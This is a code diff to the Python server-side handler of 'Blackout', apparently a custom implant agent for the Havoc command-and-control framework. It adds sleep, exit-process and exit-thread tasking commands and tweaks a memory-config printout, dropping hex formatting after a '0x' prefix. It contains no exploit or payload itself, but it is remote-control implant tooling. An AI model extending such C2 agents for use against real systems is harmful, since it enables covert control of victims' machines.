@@ -24,8 +24,8 @@ EXPLORER_CAT = 0x184
 COMMAND_SLEEP            = 0x111
 COMMAND_PPID             = 0x140
 COMMAND_BLOCKDLLS        = 0x141
-COMMAND_EXITP            = 0x155
-COMMAND_EXITT            = 0x156
+COMMAND_EXITP            = 0x160
+COMMAND_EXITT            = 0x161
 COMMAND_PROCLIST         = 0x157
 COMMAND_OUTPUT           = 0x200
 
@@ -113,9 +113,60 @@ class CommandCd( Command ):
 
         return Task.buffer
 
-class CommandExit( Command ):
-    CommandId = COMMAND_EXITT
+class CommandSleep( Command ):
+    CommandId   = COMMAND_SLEEP
+    Name        = "sleep"
+    Description = "change sleep time"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = [
+        CommandParam(
+            name="sleep_time",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
 
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_int( int( arguments[ 'sleep_time' ] ) )
+
+        return Task.buffer
+
+class CommandExitP( Command ):
+    CommandId = COMMAND_EXITP
+    Name        = "exit_process"
+    Description = "exit the process"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+
+        return Task.buffer
+
+class CommandExitT( Command ):
+    CommandId = COMMAND_EXITT
+    Name        = "exit_thread"
+    Description = "exit the thread"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+
+        return Task.buffer
 
 
 # =======================
@@ -148,7 +199,10 @@ class Blackout(AgentType):
         CommandCheckin(),
         CommandRun(),
         CommandCd,
-        CommandPwd()
+        CommandPwd(),
+        CommandSleep(),
+        CommandExitP(),
+        CommandExitT()
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
@@ -308,10 +362,10 @@ class Blackout(AgentType):
 
                 Output = (
                     f"Blackout memory config:\n"
-                    f"\t - Base Address: 0x{bk_base:X}\n"
+                    f"\t - Base Address: 0x{bk_base}\n"
                     f"\t - Length: {bk_len} | 0x{bk_len:X} bytes\n"
                     f"\t - Full Length: {bk_fullen} | 0x{bk_fullen:X} bytes\n"
-                    f"\t - RX Base Address: 0x{bk_rxbase:X}\n"
+                    f"\t - RX Base Address: 0x{bk_rxbase}\n"
                     f"\t - RX Size: {bk_rxsize} | 0x{bk_rxsize:X} bytes\n"
                     
                     f"\nProcess informations:\n"
@@ -353,6 +407,11 @@ class Blackout(AgentType):
                 elif ( explorer_id == EXPLORER_PWD ):
                     curdir = response_parser.parse_str()
                     self.console_message( AgentID, "Good", f"Current directory is: {curdir}", "" )
+
+            elif Command == COMMAND_SLEEP:
+                sleep_time = response_parser.parse_int()
+
+                self.console_message( AgentID, "Good", f"Sleep time set to {sleep_time}", "" )
 
             elif Command == BLACKOUT_ERROR:
                 ErrCode = response_parser.parse_int() 
